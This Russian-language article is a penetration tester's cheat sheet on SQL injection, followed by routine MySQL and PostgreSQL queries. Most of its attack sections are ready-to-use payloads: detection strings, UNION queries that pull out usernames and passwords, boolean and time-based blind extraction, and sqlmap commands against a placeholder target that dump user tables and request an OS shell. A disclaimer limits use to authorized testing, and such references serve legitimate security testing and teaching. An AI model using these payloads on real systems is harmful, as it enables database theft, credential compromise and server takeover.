---
title: "SQL-инъекции и запросы к базам данных: справочник пентестера"
description: "Полезные нагрузки для SQL-инъекций, атаки UNION, техники слепых SQLi и стандартные запросы для MySQL и PostgreSQL. Тактический справочник для пентестеров и администраторов баз данных."
date: 2026-02-10
tags: ["sql-injection", "cheatsheet", "penetration-testing", "database", "security"]
keywords: ["полезные нагрузки sql-инъекций", "шпаргалка команд mysql", "шпаргалка postgresql", "взлом баз данных", "команды sqlmap", "union sql-инъекция", "слепая sql-инъекция", "тестирование sql-инъекций", "перечисление баз данных", "предотвращение sql-инъекций"]
draft: false
schema_json: >
  {
    "@context": "https://schema.org",
    "@type": "TechArticle",
    "name": "SQL-инъекции и запросы к базам данных: справочник пентестера",
    "description": "Полезные нагрузки для SQL-инъекций, атаки UNION, слепые SQLi и запросы для MySQL и PostgreSQL.",
    "proficiencyLevel": "Intermediate",
    "inLanguage": "ru"
  }
---

## Инициализация системы

SQL-инъекция остаётся одной из наиболее критических уязвимостей веб-приложений — стабильно входит в OWASP Top 10. Она возникает, когда пользовательский ввод напрямую конкатенируется в SQL-запросы без надлежащей санитизации, позволяя злоумышленнику манипулировать логикой запроса к базе данных. Успешная SQL-инъекция может привести к полной эксфильтрации данных, обходу аутентификации, повышению привилегий и, в некоторых случаях, удалённому выполнению команд на сервере базы данных. Данное полевое руководство содержит как наступательные полезные нагрузки для авторизованного тестирования на проникновение, так и стандартные SQL-запросы, которые должен знать каждый администратор баз данных.

Все техники инъекций предназначены исключительно для авторизованного тестирования. Несанкционированный доступ является незаконным.

---

## Обнаружение SQLi

Прежде чем эксплуатировать уязвимость SQL-инъекции, необходимо подтвердить её существование. Обнаружение включает отправку специально сформированных данных в параметры приложения и наблюдение за ответом на предмет сообщений об ошибках, изменений поведения или временных различий. Эти начальные пробы показывают, является ли параметр инъецируемым и какой тип инъекции возможен.

### Базовые полезные нагрузки для обнаружения

```sql
-- Single quote test (triggers syntax error if vulnerable)
'

-- Double quote test
"

-- Comment-based detection
' OR 1=1--
' OR 1=1#
' OR 1=1/*

-- Numeric injection test (always true vs always false)
1 OR 1=1
1 AND 1=2

-- String-based detection
' OR 'a'='a
' OR 'a'='a'--

-- Error-based detection (force a type conversion error)
' AND 1=CONVERT(int,(SELECT @@version))--

-- Time-based detection (if the response is delayed, injection exists)
' OR SLEEP(5)--
'; WAITFOR DELAY '0:0:5'--
```

### Определение бэкенда базы данных

```sql
-- MySQL
' UNION SELECT @@version--

-- PostgreSQL
' UNION SELECT version()--

-- MSSQL
' UNION SELECT @@version--

-- Oracle
' UNION SELECT banner FROM v$version WHERE ROWNUM=1--

-- SQLite
' UNION SELECT sqlite_version()--
```

---

## Атаки UNION

SQL-инъекция на основе UNION — самая мощная техника, когда сообщения об ошибках или результаты запросов отображаются на странице. Она работает путём добавления оператора `UNION SELECT` к исходному запросу, позволяя извлекать данные из любой таблицы базы данных. Ключевое требование — определить правильное количество столбцов в исходном запросе, чтобы оператор UNION совпадал.

### Определение количества столбцов

```sql
-- Using ORDER BY (increment until error)
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
-- (error at N means there are N-1 columns)

-- Using UNION SELECT with NULL placeholders
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
-- (no error means correct column count)
```

### Извлечение данных

```sql
-- Find which columns are displayed on the page
' UNION SELECT 'a',NULL,NULL--
' UNION SELECT NULL,'a',NULL--
' UNION SELECT NULL,NULL,'a'--

-- Extract database version
' UNION SELECT NULL,@@version,NULL--

-- Extract current database name
' UNION SELECT NULL,database(),NULL--           -- MySQL
' UNION SELECT NULL,current_database(),NULL--   -- PostgreSQL

-- Extract current user
' UNION SELECT NULL,user(),NULL--               -- MySQL
' UNION SELECT NULL,current_user,NULL--         -- PostgreSQL

-- List all databases (MySQL)
' UNION SELECT NULL,schema_name,NULL FROM information_schema.schemata--

-- List all tables in a database (MySQL)
' UNION SELECT NULL,table_name,NULL FROM information_schema.tables WHERE table_schema='target_db'--

-- List columns in a table
' UNION SELECT NULL,column_name,NULL FROM information_schema.columns WHERE table_name='users'--

-- Extract usernames and passwords
' UNION SELECT NULL,CONCAT(username,':',password),NULL FROM users--
```

---

## Слепая SQL-инъекция

Когда приложение не отображает результаты запросов или сообщения об ошибках на странице, вы имеете дело со слепой SQL-инъекцией. Уязвимость по-прежнему существует, но извлечение данных требует логического вывода — либо через булевы условия (изменяется ли страница?), либо через временные задержки (ответ приходит дольше?). Слепая SQLi медленнее, но столь же опасна.

### Слепая инъекция на основе булевых значений

```sql
-- Test if the first character of the database name is 'm'
' AND SUBSTRING(database(),1,1)='m'--

-- Test using ASCII values
' AND ASCII(SUBSTRING(database(),1,1))>100--

-- Extract data character by character
' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a'--
' AND SUBSTRING((SELECT password FROM users LIMIT 1),2,1)='b'--

-- Binary search approach (faster than linear)
' AND ASCII(SUBSTRING(database(),1,1))>64--    -- Is it > '@'?
' AND ASCII(SUBSTRING(database(),1,1))>96--    -- Is it > '`'?
' AND ASCII(SUBSTRING(database(),1,1))>112--   -- Is it > 'p'?
```

### Слепая инъекция на основе времени

```sql
-- MySQL: if condition is true, response is delayed by 5 seconds
' AND IF(1=1, SLEEP(5), 0)--

-- Extract data using time delays
' AND IF(SUBSTRING(database(),1,1)='m', SLEEP(5), 0)--

-- PostgreSQL time-based
'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--

-- MSSQL time-based
'; IF (1=1) WAITFOR DELAY '0:0:5'--
```

---

## Автоматизация с SQLMap

SQLMap — это стандартный инструмент отрасли для автоматизированного обнаружения и эксплуатации SQL-инъекций. Он выполняет обнаружение, снятие отпечатков, извлечение данных и даже доступ на уровне операционной системы через SQL-инъекцию — всё из командной строки. Для авторизованных тестов на проникновение он значительно ускоряет фазу эксплуатации.

```bash
# Basic scan of a URL parameter
sqlmap -u "http://target.com/page?id=1"

# Specify the parameter to test
sqlmap -u "http://target.com/page?id=1" -p id

# Test POST request parameters
sqlmap -u "http://target.com/login" --data="username=admin&password=test"

# Use a specific technique (B=Boolean, T=Time, U=Union, E=Error)
sqlmap -u "http://target.com/page?id=1" --technique=BU

# Enumerate databases
sqlmap -u "http://target.com/page?id=1" --dbs

# Enumerate tables in a database
sqlmap -u "http://target.com/page?id=1" -D target_db --tables

# Dump a specific table
sqlmap -u "http://target.com/page?id=1" -D target_db -T users --dump

# Dump specific columns
sqlmap -u "http://target.com/page?id=1" -D target_db -T users -C username,password --dump

# Use cookies for authenticated scanning
sqlmap -u "http://target.com/page?id=1" --cookie="session=abc123"

# Increase verbosity and use threads
sqlmap -u "http://target.com/page?id=1" -v 3 --threads=5

# Try to get an OS shell
sqlmap -u "http://target.com/page?id=1" --os-shell
```

---

## Стандартные SQL-запросы

Помимо тестирования инъекций, каждый специалист по безопасности и разработчик должен знать стандартный SQL для администрирования баз данных, анализа логов и извлечения данных в ходе расследований. Эти запросы работают как в MySQL, так и в PostgreSQL и охватывают наиболее распространённые операции с базами данных.

### Запросы SELECT

```sql
-- Select all records
SELECT * FROM users;

-- Select specific columns
SELECT username, email FROM users;

-- Filter with WHERE
SELECT * FROM users WHERE role = 'admin';

-- Pattern matching
SELECT * FROM users WHERE email LIKE '%@example.com';

-- Order results
SELECT * FROM users ORDER BY created_at DESC;

-- Limit results
SELECT * FROM users LIMIT 10;
SELECT * FROM users LIMIT 10 OFFSET 20;

-- Count records
SELECT COUNT(*) FROM users WHERE active = true;

-- Distinct values
SELECT DISTINCT role FROM users;
```

### Запросы JOIN

```sql
-- Inner join (only matching records)
SELECT u.username, o.order_id, o.total
FROM users u
INNER JOIN orders o ON u.id = o.user_id;

-- Left join (all users, even without orders)
SELECT u.username, o.order_id
FROM users u
LEFT JOIN orders o ON u.id = o.user_id;

-- Multiple joins
SELECT u.username, o.order_id, p.product_name
FROM users u
JOIN orders o ON u.id = o.user_id
JOIN order_items oi ON o.id = oi.order_id
JOIN products p ON oi.product_id = p.id;
```

### INSERT, UPDATE, DELETE

```sql
-- Insert a new record
INSERT INTO users (username, email, role)
VALUES ('newuser', 'user@example.com', 'user');

-- Update a record
UPDATE users SET role = 'admin' WHERE username = 'newuser';

-- Delete a record
DELETE FROM users WHERE username = 'olduser';

-- Delete all records (use with caution)
DELETE FROM users;
TRUNCATE TABLE users;
```

### Администрирование базы данных

```sql
-- Create a database
CREATE DATABASE myapp;

-- Create a table
CREATE TABLE users (
    id SERIAL PRIMARY KEY,
    username VARCHAR(50) UNIQUE NOT NULL,
    email VARCHAR(100) NOT NULL,
    password_hash VARCHAR(255) NOT NULL,
    role VARCHAR(20) DEFAULT 'user',
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

-- Add an index
CREATE INDEX idx_users_email ON users(email);

-- Grant privileges (MySQL)
GRANT ALL PRIVILEGES ON myapp.* TO 'appuser'@'localhost';
FLUSH PRIVILEGES;

-- Grant privileges (PostgreSQL)
GRANT ALL PRIVILEGES ON DATABASE myapp TO appuser;
```
